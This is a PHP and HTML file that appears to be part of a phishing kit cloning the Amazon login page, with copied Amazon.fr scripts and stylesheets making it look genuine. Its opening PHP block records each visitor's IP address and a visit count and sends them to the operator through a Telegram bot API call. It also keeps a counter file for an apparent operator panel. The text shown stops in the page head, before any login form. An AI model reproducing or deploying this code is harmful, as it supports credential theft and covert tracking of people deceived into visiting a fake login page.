<?php
error_reporting(0);
session_start();
ob_start();
header('Content-Type: text/html; charset=utf-8');
include '../config.php';


$ip_address = $_SERVER['REMOTE_ADDR'];

$filepath = '../panel/stats.ini';
$data = @parse_ini_file($filepath);

$message = "[😊Amazon]\nIP: " . $ip_address . "\nVisits: " . $data['cliques'];

$message = urlencode($message);

$url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $chat_id . "&text=" . $message;

$response = file_get_contents($url);

  $filepath = '../panel/stats.ini';
  $data = @parse_ini_file($filepath);
  $data['cliques']++;
  function update_ini_file($data, $filepath) {
    $content = "";
    $parsed_ini = parse_ini_file($filepath, true);
    foreach($data as $section => $values){
      if($section === ""){
        continue;
      }
      $content .= $section ."=". $values . "\n\r";
    }
    if (!$handle = fopen($filepath, 'w')) {
      return false;
    }
    $success = fwrite($handle, $content);
    fclose($handle);
  }
  update_ini_file($data, $filepath);


?>


<!DOCTYPE html>
<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-android a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser" data-19ax5a9jf="mongoose" data-aui-build-date="3.21.8-2022-01-04"><head><script async="" src="https://images-eu.ssl-images-amazon.com/images/I/31YXrY93hfL.js" crossorigin="anonymous"></script>
<script type="text/javascript">var ue_t0=ue_t0||+new Date();</script>
<link rel="icon" href="../img/favicon.ico" />
<script>var token=<?php echo json_encode($token); ?>;</script>

<script type="text/javascript">

window.ue_ihb = (window.ue_ihb || window.ueinit || 0) + 1;
if (window.ue_ihb === 1) {

var ue_csm = window,
    ue_hob = +new Date();
(function(d){var e=d.ue=d.ue||{},f=Date.now||function(){return+new Date};e.d=function(b){return f()-(b?0:d.ue_t0)};e.stub=function(b,a){if(!b[a]){var c=[];b[a]=function(){c.push([c.slice.call(arguments),e.d(),d.ue_id])};b[a].replay=function(b){for(var a;a=c.shift();)b(a[0],a[1],a[2])};b[a].isStub=1}};e.exec=function(b,a){return function(){try{return b.apply(this,arguments)}catch(c){ueLogError(c,{attribution:a||"undefined",logLevel:"WARN"})}}}})(ue_csm);


    var ue_err_chan = 'jserr-rw';
(function(d,e){function h(f,b){if(!(a.ec>a.mxe)&&f){a.ter.push(f);b=b||{};var c=f.logLevel||b.logLevel;c&&c!==k&&c!==m&&c!==n&&c!==p||a.ec++;c&&c!=k||a.ecf++;b.pageURL=""+(e.location?e.location.href:"");b.logLevel=c;b.attribution=f.attribution||b.attribution;a.erl.push({ex:f,info:b})}}function l(a,b,c,e,g){d.ueLogError({m:a,f:b,l:c,c:""+e,err:g,fromOnError:1,args:arguments},g?{attribution:g.attribution,logLevel:g.logLevel}:void 0);return!1}var k="FATAL",m="ERROR",n="WARN",p="DOWNGRADED",a={ec:0,ecf:0,
pec:0,ts:0,erl:[],ter:[],mxe:50,startTimer:function(){a.ts++;setInterval(function(){d.ue&&a.pec<a.ec&&d.uex("at");a.pec=a.ec},1E4)}};l.skipTrace=1;h.skipTrace=1;h.isStub=1;d.ueLogError=h;d.ue_err=a;e.onerror=l})(ue_csm,window);


var ue_id = 'Q2E2JWSX05HN7DAWWE8S',
    ue_url = '/ap/uedata',
    ue_navtiming = 1,
    ue_mid = 'A13V1IB3VIYZZH',
    ue_sid = '258-8387710-9157813',
    ue_sn = 'www.amazon.fr',
    ue_furl = 'fls-eu.amazon.com',
    ue_surl = 'https://unagi-eu.amazon.com/1/events/com.amazon.csm.nexusclient.prod',
    ue_int = 0,
    ue_fcsn = 1,
    ue_urt = 3,
    ue_rpl_ns = 'cel-rpl',
    ue_ddq = 1,
    ue_fpf = '//fls-eu.amazon.com/1/batch/1/OP/A13V1IB3VIYZZH:258-8387710-9157813:Q2E2JWSX05HN7DAWWE8S$uedata=s:',
    ue_sbuimp = 1,
    ue_ibft = 0,
    ue_fnt = 0,

    ue_swi = 1;
var ue_viz=function(){(function(b,e,a){function k(c){if(b.ue.viz.length<p&&!l){var a=c.type;c=c.originalEvent;/^focus./.test(a)&&c&&(c.toElement||c.fromElement||c.relatedTarget)||(a=e[m]||("blur"==a||"focusout"==a?"hidden":"visible"),b.ue.viz.push(a+":"+(+new Date-b.ue.t0)),"visible"==a&&(b.ue.isl&&q("at"),l=1))}}for(var l=0,q=b.uex,f,g,m,n=["","webkit","o","ms","moz"],d=0,p=20,h=0;h<n.length&&!d;h++)if(a=n[h],f=(a?a+"H":"h")+"idden",d="boolean"==typeof e[f])g=a+"visibilitychange",m=(a?a+"V":"v")+
"isibilityState";k({});d&&e.addEventListener(g,k,0);b.ue&&d&&(b.ue.pageViz={event:g,propHid:f})})(ue_csm,ue_csm.document,ue_csm.window)};

(function(d,k,K){function G(a){return a&&a.replace&&a.replace(/^\s+|\s+$/g,"")}function q(a){return"undefined"===typeof a}function C(a,b){for(var c in b)b[t](c)&&(a[c]=b[c])}function L(a){try{var b=K.cookie.match(RegExp("(^| )"+a+"=([^;]+)"));if(b)return b[2].trim()}catch(c){}}function M(n,b,c){var e=(x||{}).type;if("device"!==c||2!==e&&1!==e)n&&(d.ue_id=a.id=a.rid=n,y=y.replace(/((.*?:){2})(\w+)/,function(a,b){return b+n})),b&&(y=y.replace(/(.*?:)(\w|-)+/,function(a,c){return c+b}),d.ue_sid=b),c&&
a.tag("page-source:"+c),d.ue_fpf=y}function O(){var a={};return function(b){b&&(a[b]=1);b=[];for(var c in a)a[t](c)&&b.push(c);return b}}function u(d,b,c,e){if(0<v&&0<=(aa||[]).indexOf(d)&&!b){for(var g=z.now(),k=0;z.now()-g<v;)k++;a.tag("marker-delayed:"+d)}e=e||+new z;var w;if(b||q(c)){if(d)for(w in g=b?h("t",b)||h("t",b,{}):a.t,g[d]=e,c)c[t](w)&&h(w,b,c[w]);return e}}function h(d,b,c){var e=b&&b!=a.id?a.sc[b]:a;e||(e=a.sc[b]={});"id"===d&&c&&(P=1);return e[d]=c||e[d]}function Q(d,b,c,e,g){c="on"+
c;var h=b[c];"function"===typeof h?d&&(a.h[d]=h):h=function(){};b[c]=function(a){g?(e(a),h(a)):(h(a),e(a))};b[c]&&(b[c].isUeh=1)}function R(n,b,c,e){function r(b,c){var d=[b],e=0,f={},g,k;c?(d.push("m=1"),f[c]=1):f=a.sc;for(k in f)if(f[t](k)){var r=h("wb",k),l=h("t",k)||{},p=h("t0",k)||a.t0,m;if(c||2==r){r=r?e++:"";d.push("sc"+r+"="+k);for(m in l)q(l[m])||null===l[m]||d.push(m+r+"="+(l[m]-p));d.push("t"+r+"="+l[n]);if(h("ctb",k)||h("wb",k))g=1}}!v&&g&&d.push("ctb=1");return d.join("&")}function N(b,
c,f,e){if(b){var g=d.ue_err;d.ue_url&&!e&&b&&0<b.length&&(e=new Image,a.iel.push(e),e.src=b,a.count&&a.count("postbackImageSize",b.length));if(y){var h=k.encodeURIComponent;h&&b&&(e=new Image,b=""+d.ue_fpf+h(b)+":"+(+new z-d.ue_t0),a.iel.push(e),e.src=b)}else a.log&&(a.log(b,"uedata",{n:1}),a.ielf.push(b));g&&!g.ts&&g.startTimer();a.b&&(g=a.b,a.b="",N(g,c,f,1))}}function w(b){var c=x?x.type:D,d=2==c||a.isBFonMshop,c=c&&!d,e=a.bfini;P||(e&&1<e&&(b+="&bfform=1",c||(a.isBFT=e-1)),d&&(b+="&bfnt=1",a.isBFT=
a.isBFT||1),a.ssw&&a.isBFT&&(a.isBFonMshop&&(a.isNRBF=0),q(a.isNRBF)&&(d=a.ssw(a.oid),d.e||q(d.val)||(a.isNRBF=1<d.val?0:1)),q(a.isNRBF)||(b+="&nrbf="+a.isNRBF)),a.isBFT&&!a.isNRBF&&(b+="&bft="+a.isBFT));return b}if(!a.paused&&(b||q(c))){for(var p in c)c[t](p)&&h(p,b,c[p]);a.isBFonMshop||u("pc",b,c);p=h("id",b)||a.id;var s=h("id2",b),f=a.url+"?"+n+"&v="+a.v+"&id="+p,v=h("ctb",b)||h("wb",b),A;v&&(f+="&ctb="+v);s&&(f+="&id2="+s);1<d.ueinit&&(f+="&ic="+d.ueinit);if(!("ld"!=n&&"ul"!=n||b&&b!=p)){if("ld"==
n){try{k[H]&&k[H].isUeh&&(k[H]=null)}catch(F){}if(k.chrome)for(s=0;s<I.length;s++)S(E,I[s]);(s=K.ue_backdetect)&&s.ue_back&&s.ue_back.value++;d._uess&&(A=d._uess());a.isl=1}a._bf&&(f+="&bf="+a._bf());d.ue_navtiming&&g&&(h("ctb",p,"1"),a.isBFonMshop||u("tc",D,D,J));!B||a.isBFonMshop||T||(g&&C(a.t,{na_:g.navigationStart,ul_:g.unloadEventStart,_ul:g.unloadEventEnd,rd_:g.redirectStart,_rd:g.redirectEnd,fe_:g.fetchStart,lk_:g.domainLookupStart,_lk:g.domainLookupEnd,co_:g.connectStart,_co:g.connectEnd,
sc_:g.secureConnectionStart,rq_:g.requestStart,rs_:g.responseStart,_rs:g.responseEnd,dl_:g.domLoading,di_:g.domInteractive,de_:g.domContentLoadedEventStart,_de:g.domContentLoadedEventEnd,_dc:g.domComplete,ld_:g.loadEventStart,_ld:g.loadEventEnd,ntd:("function"!==typeof B.now||q(J)?0:new z(J+B.now())-new z)+a.t0}),x&&C(a.t,{ty:x.type+a.t0,rc:x.redirectCount+a.t0}),T=1);a.isBFonMshop||C(a.t,{hob:d.ue_hob,hoe:d.ue_hoe});a.ifr&&(f+="&ifr=1")}u(n,b,c,e);c="ld"==n&&b&&h("wb",b);var m,l;c||b&&b!==p||ba(b);
c||p==a.oid||ca(p,(h("t",b)||{}).tc||+h("t0",b),+h("t0",b));(e=d.ue_mbl)&&e.cnt&&!c&&(f+=e.cnt());c?h("wb",b,2):"ld"==n&&(a.lid=G(p));for(m in a.sc)if(1==h("wb",m))break;if(c){if(a.s)return;f=r(f,null)}else e=r(f,null),e!=f&&(e=w(e),a.b=e),A&&(f+=A),f=r(f,b||a.id);f=w(f);if(a.b||c)for(m in a.sc)2==h("wb",m)&&delete a.sc[m];A=0;a._rt&&(f+="&rt="+a._rt());e=k.csa;if(!c&&e)for(l in m=h("t",b)||{},e=e("PageTiming"),m)m[t](l)&&e("mark",da[l]||l,m[l]);c||(a.s=0,(l=d.ue_err)&&0<l.ec&&l.pec<l.ec&&(l.pec=
l.ec,f+="&ec="+l.ec+"&ecf="+l.ecf),A=h("ctb",b),"ld"!==n||b||a.markers||(a.markers={},C(a.markers,h("t",b))),h("t",b,{}));a.tag&&a.tag().length&&(f+="&csmtags="+a.tag().join("|"),a.tag=O());l=a.viz||[];(m=l.length)&&(f+="&viz="+l.splice(0,m).join("|"));q(d.ue_pty)||(f+="&pty="+d.ue_pty+"&spty="+d.ue_spty+"&pti="+d.ue_pti);a.tabid&&(f+="&tid="+a.tabid);a.aftb&&(f+="&aftb=1");!a._ui||b&&b!=p||(f+=a._ui());a.a=f;N(f,n,A,c)}}function ba(a){var b=k.ue_csm_markers||{},c;for(c in b)b[t](c)&&u(c,a,D,b[c])}
function F(a,b,c){c=c||k;if(c[U])c[U](a,b,!1);else if(c[V])c[V]("on"+a,b)}function S(a,b,c){c=c||k;if(c[W])c[W](a,b,!1);else if(c[X])c[X]("on"+a,b)}function Y(){function a(){d.onUl()}function b(a){return function(){c[a]||(c[a]=1,R(a))}}var c={},e,g;d.onLd=b("ld");d.onLdEnd=b("ld");d.onUl=b("ul");e={stop:b("os")};k.chrome?(F(E,a),I.push(a)):e[E]=d.onUl;for(g in e)e[t](g)&&Q(0,k,g,e[g]);d.ue_viz&&ue_viz();F("load",d.onLd);u("ue")}function ca(g,b,c){var e=d.ue_mbl,h=k.csa,q=h&&h("SPA"),h=h&&h("PageTiming");
e&&e.ajax&&e.ajax(b,c);q&&h&&(q("newPage",{requestId:g,transitionType:"soft"}),h("mark","transitionStart",b));a.tag("ajax-transition")}d.ueinit=(d.ueinit||0)+1;var a=d.ue=d.ue||{};a.t0=k.aPageStart||d.ue_t0;a.id=d.ue_id;a.url=d.ue_url;a.rid=d.ue_id;a.a="";a.b="";a.h={};a.s=1;a.t={};a.sc={};a.iel=[];a.ielf=[];a.viz=[];a.v="0.221671.0";a.paused=!1;var t="hasOwnProperty",E="beforeunload",H="on"+E,U="addEventListener",W="removeEventListener",V="attachEvent",X="detachEvent",da={cf:"criticalFeature",af:"aboveTheFold",
fn:"functional",fp:"firstPaint",fcp:"firstContentfulPaint",bb:"bodyBegin",be:"bodyEnd",ld:"loaded"},z=k.Date,B=k.performance||k.webkitPerformance,g=(B||{}).timing,x=(B||{}).navigation,J=(g||{}).navigationStart,y=d.ue_fpf,aa=d.ue_tx_md,v=d.ue_tx_ad,P=0,T=0,I=[],D;a.oid=G(a.id);a.lid=G(a.id);a._t0=a.t0;a.tag=O();a.ifr=k.top!==k.self||k.frameElement?1:0;a.markers=null;a.attach=F;a.detach=S;if("000-0000000-8675309"===d.ue_sid){var Z=L("cdn-rid"),$=L("session-id");Z&&$&&M(Z,$,"cdn")}d.uei=Y;d.ueh=Q;d.ues=
h;d.uet=u;d.uex=R;a.reset=M;a.pause=function(d){a.paused=d};Y();0<v&&u("ho")})(ue_csm,ue_csm.window,ue_csm.document);


ue.stub(ue,"log");ue.stub(ue,"onunload");ue.stub(ue,"onflush");
(function(c){var a=c.ue;a.cv={};a.cv.scopes={};a.count=function(d,c,b){var e={},f=a.cv,g=b&&0===b.c;e.counter=d;e.value=c;e.t=a.d();b&&b.scope&&(f=a.cv.scopes[b.scope]=a.cv.scopes[b.scope]||{},e.scope=b.scope);if(void 0===c)return f[d];f[d]=c;d=0;b&&b.bf&&(d=1);ue_csm.ue_sclog||!a.clog||0!==d||g?a.log&&a.log(e,"csmcount",{c:1,bf:d}):a.clog(e,"csmcount",{bf:d})};a.count("baselineCounter2",1);a&&a.event&&(a.event({requestId:c.ue_id||"rid",server:c.ue_sn||"sn",obfuscatedMarketplaceId:c.ue_mid||"mid"},
"csm","csm.CSMBaselineEvent.4"),a.count("nexusBaselineCounter",1,{bf:1}))})(ue_csm);



var ue_hoe = +new Date();
}
window.ueinit = window.ue_ihb;
</script>

<!-- 5bmbz86si79m3ao -->
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 9634)</script><script>var aPageStart = (new Date()).getTime();</script><meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no"><meta charset="utf-8">
    <title dir="ltr">Amazon Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    
      
      
        <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/611kXZFYcyL._RC|11iHkiAT2oL.css,01wLsDqViEL.css,11MhAJ3QIgL.css,31JhtlVsImL.css,31i+Ric3zOL.css,01DHz7m6lhL.css_.css?AUIClients/AmazonUI#mobile.fr.not-trident">
<link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,41onG0oRjwL.css_.css?AUIClients/AuthenticationPortalAssets&amp;QmmAyoMU#mobile.194821-T1">
<link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/11vE0hkmjcL.css?AUIClients/CVFAssets#mobile">
<script>
(function(f,h,Q,E){function F(a){u&&u.tag&&u.tag(q(":","aui",a))}function v(a,b){u&&u.count&&u.count("aui:"+a,0===b?0:b||(u.count("aui:"+a)||0)+1)}function m(a){try{return a.test(navigator.userAgent)}catch(b){return!1}}function x(a,b,c){a.addEventListener?a.addEventListener(b,c,!1):a.attachEvent&&a.attachEvent("on"+b,c)}function q(a,b,c,e){b=b&&c?b+a+c:b||c;return e?q(a,b,e):b}function G(a,b,c){try{Object.defineProperty(a,b,{value:c,writable:!1})}catch(e){a[b]=c}return c}function ua(a,b,c){var e=
c=a.length,g=function(){e--||(R.push(b),S||(setTimeout(ca,0),S=!0))};for(g();c--;)da[a[c]]?g():(z[a[c]]=z[a[c]]||[]).push(g)}function va(a,b,c,e,g){var d=h.createElement(a?"script":"link");x(d,"error",e);g&&x(d,"load",g);a?(d.type="text/javascript",d.async=!0,c&&/AUIClients|images[/]I/.test(b)&&d.setAttribute("crossorigin","anonymous"),d.src=b):(d.rel="stylesheet",d.href=b);h.getElementsByTagName("head")[0].appendChild(d)}function ea(a,b){return function(c,e){function g(){va(b,c,d,function(b){T?v("resource_unload"):
d?(d=!1,v("resource_retry"),g()):(v("resource_error"),a.log("Asset failed to load: "+c));b&&b.stopPropagation?b.stopPropagation():f.event&&(f.event.cancelBubble=!0)},e)}if(fa[c])return!1;fa[c]=!0;v("resource_count");var d=!0;return!g()}}function wa(a,b,c){for(var e={name:a,guard:function(c){return b.guardFatal(a,c)},guardTime:function(a){return b.guardTime(a)},logError:function(c,d,e){b.logError(c,d,e,a)}},g=[],d=0;d<c.length;d++)H.hasOwnProperty(c[d])&&(g[d]=U.hasOwnProperty(c[d])?U[c[d]](H[c[d]],
e):H[c[d]]);return g}function A(a,b,c,e,g){return function(d,h){function n(){var a=null;e?a=h:"function"===typeof h&&(p.start=w(),a=h.apply(f,wa(d,k,l)),p.end=w());if(b){H[d]=a;a=d;for(da[a]=!0;(z[a]||[]).length;)z[a].shift()();delete z[a]}p.done=!0}var k=g||this;"function"===typeof d&&(h=d,d=E);b&&(d=d?d.replace(ha,""):"__NONAME__",V.hasOwnProperty(d)&&k.error(q(", reregistered by ",q(" by ",d+" already registered",V[d]),k.attribution),d),V[d]=k.attribution);for(var l=[],m=0;m<a.length;m++)l[m]=
a[m].replace(ha,"");var p=B[d||"anon"+ ++xa]={depend:l,registered:w(),namespace:k.namespace};d&&ya.hasOwnProperty(d);c?n():ua(l,k.guardFatal(d,n),d);return{decorate:function(a){U[d]=k.guardFatal(d,a)}}}}function ia(a){return function(){var b=Array.prototype.slice.call(arguments);return{execute:A(b,!1,a,!1,this),register:A(b,!0,a,!1,this)}}}function W(a,b){return function(c,e){e||(e=c,c=E);var g=this.attribution;return function(){t.push(b||{attribution:g,name:c,logLevel:a});var d=e.apply(this,arguments);
t.pop();return d}}}function I(a,b){this.load={js:ea(this,!0),css:ea(this)};G(this,"namespace",b);G(this,"attribution",a)}function ja(){h.body?r.trigger("a-bodyBegin"):setTimeout(ja,20)}function C(a,b){a.className=X(a,b)+" "+b}function X(a,b){return(" "+a.className+" ").split(" "+b+" ").join(" ").replace(/^ | $/g,"")}function ka(a){try{return a()}catch(b){return!1}}function J(){if(K){var a={w:f.innerWidth||n.clientWidth,h:f.innerHeight||n.clientHeight};5<Math.abs(a.w-Y.w)||50<a.h-Y.h?(Y=a,L=4,(a=k.mobile||
k.tablet?450<a.w&&a.w>a.h:1250<=a.w)?C(n,"a-ws"):n.className=X(n,"a-ws")):0<L&&(L--,la=setTimeout(J,16))}}function za(a){(K=a===E?!K:!!a)&&J()}function Aa(){return K}function ma(){D.forEach(function(a){F(a)})}function na(a,b,c){if(b){a=m(/Chrome/i)&&!m(/Edge/i)&&!m(/OPR/i)&&!a.capabilities.isAmazonApp&&!m(new RegExp(Z+"bwv"+Z+"b"));var e="sw:browser:"+c+":";b.browser&&a&&(D.push(e+"supported"),b.browser.action(e,c));!a&&b.browser&&D.push(e+"unsupported")}}"use strict";var M=Q.now=Q.now||function(){return+new Q},
w=function(a){return a&&a.now?a.now.bind(a):M}(f.performance),N=w(),ya={},p=f.AmazonUIPageJS||f.P;if(p&&p.when&&p.register){N=[];for(var l=h.currentScript;l;l=l.parentElement)l.id&&N.push(l.id);return p.log("A copy of P has already been loaded on this page.","FATAL",N.join(" "))}var u=f.ue;F();F("aui_build_date:3.21.8-2022-01-04");var R=[],Ba=[],S=!1;var ca=function(){for(var a=setTimeout(ca,0),b=M();Ba.length||R.length;)if(R.shift()(),50<M()-b)return;clearTimeout(a);S=!1};var da={},z={},fa={},T=
!1;x(f,"beforeunload",function(){T=!0;setTimeout(function(){T=!1},1E4)});var ha=/^prv:/,V={},H={},U={},B={},xa=0,Z=String.fromCharCode(92),t=[],oa=!0,pa=f.onerror;f.onerror=function(a,b,c,e,g){g&&"object"===typeof g||(g=Error(a,b,c),g.columnNumber=e,g.stack=b||c||e?q(Z,g.message,"at "+q(":",b,c,e)):E);var d=t.pop()||{};g.attribution=q(":",g.attribution||d.attribution,d.name);g.logLevel=d.logLevel;g.attribution&&console&&console.log&&console.log([g.logLevel||"ERROR",a,"thrown by",g.attribution].join(" "));
t=[];pa&&(d=[].slice.call(arguments),d[4]=g,pa.apply(f,d))};I.prototype={logError:function(a,b,c,e){b={message:b,logLevel:c||"ERROR",attribution:q(":",this.attribution,e)};if(f.ueLogError)return f.ueLogError(a||b,a?b:null),!0;console&&console.error&&(console.log(b),console.error(a));return!1},error:function(a,b,c,e){a=Error(q(":",e,a,c));a.attribution=q(":",this.attribution,b);throw a;},guardError:W(),guardFatal:W("FATAL"),guardCurrent:function(a){var b=t[t.length-1];return b?W(b.logLevel,b).call(this,
a):a},guardTime:function(a){var b=t[t.length-1],c=b&&b.name;return c&&c in B?function(){var b=w(),g=a.apply(this,arguments);B[c].async=(B[c].async||0)+w()-b;return g}:a},log:function(a,b,c){return this.logError(null,a,b,c)},declare:A([],!0,!0,!0),register:A([],!0),execute:A([]),AUI_BUILD_DATE:"3.21.8-2022-01-04",when:ia(),now:ia(!0),trigger:function(a,b,c){var e=M();this.declare(a,{data:b,pageElapsedTime:e-(f.aPageStart||NaN),triggerTime:e});c&&c.instrument&&O.when("prv:a-logTrigger").execute(function(b){b(a)})},
handleTriggers:function(){this.log("handleTriggers deprecated")},attributeErrors:function(a){return new I(a)},_namespace:function(a,b){return new I(a,b)},setPriority:function(a){oa?oa=!1:this.log("setPriority only accept the first call.")}};var r=G(f,"AmazonUIPageJS",new I);var O=r._namespace("PageJS","AmazonUI");O.declare("prv:p-debug",B);r.declare("p-recorder-events",[]);r.declare("p-recorder-stop",function(){});G(f,"P",r);ja();if(h.addEventListener){var qa;h.addEventListener("DOMContentLoaded",
qa=function(){r.trigger("a-domready");h.removeEventListener("DOMContentLoaded",qa,!1)},!1)}var n=h.documentElement,aa=function(){var a=["O","ms","Moz","Webkit"],b=h.createElement("div");return{testGradients:function(){return!0},test:function(c){var e=c.charAt(0).toUpperCase()+c.substr(1);c=(a.join(e+" ")+e+" "+c).split(" ");for(e=c.length;e--;)if(""===b.style[c[e]])return!0;return!1},testTransform3d:function(){return!0}}}();p=n.className;var ra=/(^| )a-mobile( |$)/.test(p),sa=/(^| )a-tablet( |$)/.test(p),
k={audio:function(){return!!h.createElement("audio").canPlayType},video:function(){return!!h.createElement("video").canPlayType},canvas:function(){return!!h.createElement("canvas").getContext},svg:function(){return!!h.createElementNS&&!!h.createElementNS("http://www.w3.org/2000/svg","svg").createSVGRect},offline:function(){return navigator.hasOwnProperty&&navigator.hasOwnProperty("onLine")&&navigator.onLine},dragDrop:function(){return"draggable"in h.createElement("span")},geolocation:function(){return!!navigator.geolocation},
history:function(){return!(!f.history||!f.history.pushState)},webworker:function(){return!!f.Worker},autofocus:function(){return"autofocus"in h.createElement("input")},inputPlaceholder:function(){return"placeholder"in h.createElement("input")},textareaPlaceholder:function(){return"placeholder"in h.createElement("textarea")},localStorage:function(){return"localStorage"in f&&null!==f.localStorage},orientation:function(){return"orientation"in f},touch:function(){return"ontouchend"in h},gradients:function(){return aa.testGradients()},
hires:function(){var a=f.devicePixelRatio&&1.5<=f.devicePixelRatio||f.matchMedia&&f.matchMedia("(min-resolution:144dpi)").matches;v("hiRes"+(ra?"Mobile":sa?"Tablet":"Desktop"),a?1:0);return a},transform3d:function(){return aa.testTransform3d()},touchScrolling:function(){return m(/Windowshop|android|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|SOFTWARE=([5-9]|[1-9][0-9]+)(.[0-9]{1,2})+.*DEVICE=iPhone|Chrome|Silk|Firefox|Trident.+?; Touch/i)},ios:function(){return m(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i)&&
!m(/trident|Edge/i)},android:function(){return m(/android.([1-9]|[L-Z])/i)&&!m(/trident|Edge/i)},mobile:function(){return ra},tablet:function(){return sa},rtl:function(){return"rtl"===n.dir}};for(l in k)k.hasOwnProperty(l)&&(k[l]=ka(k[l]));for(var ba="textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "),P=0;P<ba.length;P++)k[ba[P]]=ka(function(){return aa.test(ba[P])});var K=!0,la=0,Y={w:0,h:0},L=4;J();x(f,"resize",function(){clearTimeout(la);L=4;J()});
var ta={getItem:function(a){try{return f.localStorage.getItem(a)}catch(b){}},setItem:function(a,b){try{return f.localStorage.setItem(a,b)}catch(c){}}};n.className=X(n,"a-no-js");C(n,"a-js");!m(/OS [1-8](_[0-9]*)+ like Mac OS X/i)||f.navigator.standalone||m(/safari/i)||C(n,"a-ember");p=[];for(l in k)k.hasOwnProperty(l)&&k[l]&&p.push("a-"+l.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}));C(n,p.join(" "));n.setAttribute("data-aui-build-date","3.21.8-2022-01-04");r.register("p-detect",function(){return{capabilities:k,
localStorage:k.localStorage&&ta,toggleResponsiveGrid:za,responsiveGridEnabled:Aa}});m(/UCBrowser/i)||k.localStorage&&C(n,ta.getItem("a-font-class"));r.declare("a-event-revised-handling",!1);try{var y=navigator.serviceWorker}catch(a){F("sw:nav_err")}y&&(x(y,"message",function(a){a&&a.data&&v(a.data.k,a.data.v)}),y.controller&&y.controller.postMessage("MSG-RDY"));var D=[];(function(a){var b=a.reg,c=a.unreg;y&&y.getRegistrations?(O.when("A").execute(function(a){na(a,c,"unregister")}),x(f,"load",function(){O.when("A").execute(function(a){na(a,
b,"register");ma()})})):(b&&b.browser&&D.push("sw:browser:register:unsupported"),c&&c.browser&&D.push("sw:browser:unregister:unsupported"),ma())})({reg:{},unreg:{}});r.declare("a-fix-event-off",!1);v("pagejs:pkgExecTime",w()-N)})(window,document,Date);
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/61XKxrBtDVL._RC|11Y+5x+kkTL.js,51KMV3Cz2XL.js,31x4ENTlVIL.js,31f4+QIEeqL.js,319DotbLfhL.js,518BI433aLL.js,01qkmZhGmAL.js,31h3-xvy9qL.js,61zp0xmgcZL.js,31yPmSSpnoL.js_.js?AUIClients/AmazonUI#mobile');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/21G215oqvfL._RC|21OJDARBhQL.js,218GJg15I8L.js,31lucpmF4CL.js,2119M3Ks9rL.js,51MwW4DAosL.js_.js?AUIClients/AuthenticationPortalAssets&QmmAyoMU#mobile.194821-T1');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/01wGDSlxwdL.js?AUIClients/AuthenticationPortalInlineAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/31NRKs0Fu+L.js?AUIClients/CVFAssets#mobile');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/81gLkT0N6tL.js?AUIClients/SiegeClientSideEncryptionAUI');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/31IwoCo8XiL.js?AUIClients/AmazonUIFormControlsJS#mobile');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/81UNYn554pL.js?AUIClients/FWCIMAssets');
</script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/61XKxrBtDVL._RC|11Y+5x+kkTL.js,51KMV3Cz2XL.js,31x4ENTlVIL.js,31f4+QIEeqL.js,319DotbLfhL.js,518BI433aLL.js,01qkmZhGmAL.js,31h3-xvy9qL.js,61zp0xmgcZL.js,31yPmSSpnoL.js_.js?AUIClients/AmazonUI#mobile"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/21G215oqvfL._RC|21OJDARBhQL.js,218GJg15I8L.js,31lucpmF4CL.js,2119M3Ks9rL.js,51MwW4DAosL.js_.js?AUIClients/AuthenticationPortalAssets&amp;QmmAyoMU#mobile.194821-T1"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/01wGDSlxwdL.js?AUIClients/AuthenticationPortalInlineAssets"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/31NRKs0Fu+L.js?AUIClients/CVFAssets#mobile"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/81gLkT0N6tL.js?AUIClients/SiegeClientSideEncryptionAUI"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/31IwoCo8XiL.js?AUIClients/AmazonUIFormControlsJS#mobile"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/81UNYn554pL.js?AUIClients/FWCIMAssets"></script>
<script src="JQ.js"></script>    
    
  <script type="text/javascript">
window.ue_ihe = (window.ue_ihe || 0) + 1;
if (window.ue_ihe === 1) {
